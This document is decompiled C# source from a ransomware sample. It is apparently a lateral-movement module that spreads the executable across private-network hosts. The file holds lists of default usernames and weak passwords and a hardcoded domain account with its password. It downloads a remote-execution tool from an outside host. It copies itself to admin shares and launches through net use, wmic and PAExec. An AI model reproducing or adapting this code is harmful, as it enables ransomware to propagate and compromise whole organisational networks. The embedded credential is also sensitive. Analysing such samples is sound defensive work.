// Decompiled with JetBrains decompiler
// Type: MufMaOSvGyvz.IxJlmmAtIYbweZ
// Assembly: Final-02.exe, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C3A0FEE4-03D5-43E6-BB9B-FAFC16FEF04E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.01-msil\HEUR-Trojan-Ransom.Win32.Generic-6a5090762c6058bc223e37e89f53832faad80995e3c5ed7e59ed9f5a5e604e47.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Reflection;
using System.Text.RegularExpressions;
using System.Threading;

namespace MufMaOSvGyvz
{
  internal class IxJlmmAtIYbweZ
  {
    public static List<string> wHmHGfpgcyEAPS = new List<string>();
    public static string SjeaxFYLqZIz = "";
    public static List<string> VimhkXdlfPlXCvI = new List<string>()
    {
      "Administrator",
      "Admin",
      "Guest",
      "User",
      "User1",
      "user-1",
      "Test",
      "root",
      "buh",
      "boss",
      "ftp",
      "rdp",
      "rdpuser",
      "rdpadmin",
      "manager",
      "support",
      "work",
      "other user",
      "operator",
      "backup",
      "asus",
      "ftpuser",
      "ftpadmin",
      "nas",
      "nasuser",
      "nasadmin",
      "superuser",
      "netguest",
      "alex"
    };
    public static List<string> caCKFFEBtAvLMh = new List<string>()
    {
      "Administrator",
      "administrator",
      "Guest",
      "guest",
      "User",
      "user",
      "Admin",
      "adminTest",
      "test",
      "root",
      "root",
      "123",
      "1234",
      "12345",
      "123456",
      "1234567",
      "12345678",
      "123456789",
      "1234567890",
      "Administrator123",
      "administrator123",
      "Guest123",
      "guest123",
      "User123",
      "user123",
      "Admin123",
      "admin123Test123",
      "test123",
      "password",
      "111111",
      "55555",
      "77777",
      "777",
      "qwe",
      "qwe123",
      "qwe321",
      "qwer",
      "qwert",
      "qwerty",
      "qwerty123",
      "zxc",
      "zxc123",
      "zxcv",
      "uiop",
      "123321",
      "321",
      "love",
      "secret"
    };

    public static void DtsYjXXFKl()
    {
      try
      {
        IxJlmmAtIYbweZ.wHmHGfpgcyEAPS = IxJlmmAtIYbweZ.WPuYWIHaxaiFwM();
      }
      catch
      {
        return;
      }
      string str1 = "";
      if (IxJlmmAtIYbweZ.wHmHGfpgcyEAPS.Count > 0)
      {
        try
        {
          str1 = IxJlmmAtIYbweZ.aWbHWMZJwBHx();
        }
        catch
        {
          return;
        }
      }
      try
      {
        if (System.IO.File.Exists(str1))
        {
          foreach (string str2 in IxJlmmAtIYbweZ.wHmHGfpgcyEAPS)
          {
            if ((str2.StartsWith("10.") || str2.StartsWith("172.16.") ? 0 : (!str2.StartsWith("192.168.") ? 1 : 0)) == 0)
            {
              try
              {
                if (IyUWqQZlcOSTLhq.ylIKJJsgdllsSVj == "YES")
                {
                  IyUWqQZlcOSTLhq.tbluQOozLSqDhFc("net.exe", "use \\\\" + str2 + " /USER:SHJPOLICE\\amer !Omar2012");
                  Thread.Sleep(2000);
                  System.IO.File.Copy(Assembly.GetEntryAssembly().Location, "\\\\" + str2 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly().Location), true);
                  if (System.IO.File.Exists("\\\\" + str2 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly().Location)))
                    IyUWqQZlcOSTLhq.tbluQOozLSqDhFc("wmic.exe", "/node:" + str2 + " /user:SHJPOLICE\\amer /password:!Omar2012 process call create cmd.exe /c \\" + str2 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly().Location));
                }
                else
                {
                  IyUWqQZlcOSTLhq.tbluQOozLSqDhFc("net.exe", "use \\\\" + str2);
                  Thread.Sleep(2000);
                  System.IO.File.Copy(Assembly.GetEntryAssembly().Location, "\\\\" + str2 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly().Location), true);
                  if (System.IO.File.Exists("\\\\" + str2 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly().Location)))
                    IyUWqQZlcOSTLhq.tbluQOozLSqDhFc("wmic.exe", "/node:" + str2 + " process call create cmd.exe /c \\\\" + str2 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly().Location));
                }
              }
              catch
              {
              }
              if (IyUWqQZlcOSTLhq.ylIKJJsgdllsSVj == "YES")
                IyUWqQZlcOSTLhq.tbluQOozLSqDhFc(str1, "\\" + str2 + " -u SHJPOLICE\\amer -p !Omar2012 -d -f -h -s -n 2 -c " + Assembly.GetEntryAssembly().Location);
              else
                IyUWqQZlcOSTLhq.tbluQOozLSqDhFc(str1, "\\" + str2 + " -d -f -h -s -n 2 -c " + Assembly.GetEntryAssembly().Location);
            }
          }
        }
      }
      catch
      {
        return;
      }
      List<VJsusgqzfWSrbMi> vjsusgqzfWsrbMiList = VJsusgqzfWSrbMi.waPssoquJEsup();
      foreach (VJsusgqzfWSrbMi vjsusgqzfWsrbMi in vjsusgqzfWsrbMiList)
      {
        try
        {
          if ((vjsusgqzfWsrbMi.IPAddress.StartsWith("10.") || vjsusgqzfWsrbMi.IPAddress.StartsWith("172.16.") ? 0 : (!vjsusgqzfWsrbMi.IPAddress.StartsWith("192.168.") ? 1 : 0)) == 0)
            OwlpRzDmPpi.KXPzXivlwAnerFl(vjsusgqzfWsrbMi.MacAddress, vjsusgqzfWsrbMi.IPAddress, "255.255.255.0");
        }
        catch
        {
          return;
        }
      }
      foreach (VJsusgqzfWSrbMi vjsusgqzfWsrbMi in vjsusgqzfWsrbMiList)
      {
        try
        {
          Regex regex = new Regex(".");
          List<string> stringList = uxsJIvhyQFYmmD.YvYIrpWzUqcA(regex.Split(vjsusgqzfWsrbMi.IPAddress)[0] + "." + regex.Split(vjsusgqzfWsrbMi.IPAddress)[1] + "." + regex.Split(vjsusgqzfWsrbMi.IPAddress)[2]);
          using (List<string>.Enumerator enumerator1 = stringList.GetEnumerator())
          {
label_50:
            while (enumerator1.MoveNext())
            {
              string current1 = enumerator1.Current;
              IxJlmmAtIYbweZ.SjeaxFYLqZIz = current1;
              using (List<string>.Enumerator enumerator2 = stringList.GetEnumerator())
              {
                while (true)
                {
                  string current2;
                  do
                  {
                    if (enumerator2.MoveNext())
                      current2 = enumerator2.Current;
                    else
                      goto label_50;
                  }
                  while ((current2.StartsWith("10.") || current2.StartsWith("172.16.") ? 0 : (!current2.StartsWith("192.168.") ? 1 : 0)) != 0);
                  try
                  {
                    if (IyUWqQZlcOSTLhq.ylIKJJsgdllsSVj == "YES")
                    {
                      IyUWqQZlcOSTLhq.tbluQOozLSqDhFc("net.exe", "use \\\\" + current2 + " /USER:SHJPOLICE\\amer !Omar2012");
                      Thread.Sleep(2000);
                      System.IO.File.Copy(Assembly.GetEntryAssembly().Location, "\\\\" + current2 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly().Location), true);
                      if (System.IO.File.Exists("\\\\" + current2 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly().Location)))
                        IyUWqQZlcOSTLhq.tbluQOozLSqDhFc("wmic.exe", "/node:" + current2 + " /user:SHJPOLICE\\amer /password:!Omar2012 process call create cmd.exe /c \\\\" + current2 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly().Location));
                    }
                    else
                    {
                      IyUWqQZlcOSTLhq.tbluQOozLSqDhFc("net.exe", "use \\\\" + current1);
                      Thread.Sleep(2000);
                      System.IO.File.Copy(Assembly.GetEntryAssembly().Location, "\\\\" + current2 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly().Location), true);
                      if (System.IO.File.Exists("\\\\" + current2 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly().Location)))
                        IyUWqQZlcOSTLhq.tbluQOozLSqDhFc("wmic.exe", "/node:" + current2 + " process call create cmd.exe /c \\\\" + current2 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly().Location));
                    }
                  }
                  catch
                  {
                  }
                  if (IyUWqQZlcOSTLhq.ylIKJJsgdllsSVj == "YES")
                    IyUWqQZlcOSTLhq.tbluQOozLSqDhFc(str1, "\\" + current2 + " -u SHJPOLICE\\amer -p !Omar2012 -d -f -h -s -n 2 -c " + Assembly.GetEntryAssembly().Location);
                  else
                    IyUWqQZlcOSTLhq.tbluQOozLSqDhFc(str1, "\\" + current2 + " -d -f -h -s -n 2 -c " + Assembly.GetEntryAssembly().Location);
                }
              }
            }
          }
        }
        catch
        {
          return;
        }
      }
      if (!System.IO.File.Exists(str1))
        return;
      System.IO.File.Delete(str1);
    }

    public static List<string> WPuYWIHaxaiFwM()
    {
      List<string> stringList = new List<string>();
      foreach (IPAddress address in Dns.GetHostEntry(Dns.GetHostName()).AddressList)
      {
        if (address.AddressFamily.ToString() == "InterNetwork")
          stringList.Add(address.ToString());
      }
      return stringList;
    }

    public static string aWbHWMZJwBHx() => IntPtr.Size != 8 ? IxJlmmAtIYbweZ.ebvNzgnWqxnEn(new Uri("https://www.poweradmin.com/paexec/paexec.exe")) : IxJlmmAtIYbweZ.ebvNzgnWqxnEn(new Uri("https://www.poweradmin.com/paexec/paexec.exe"));

    public static string ebvNzgnWqxnEn(Uri uri_0)
    {
      string path2 = Path.GetRandomFileName().Replace(".", "").Remove(0, 3) + ".exe";
      new WebClient().DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path2));
      return Path.Combine(Path.GetTempPath(), path2);
    }
  }
}
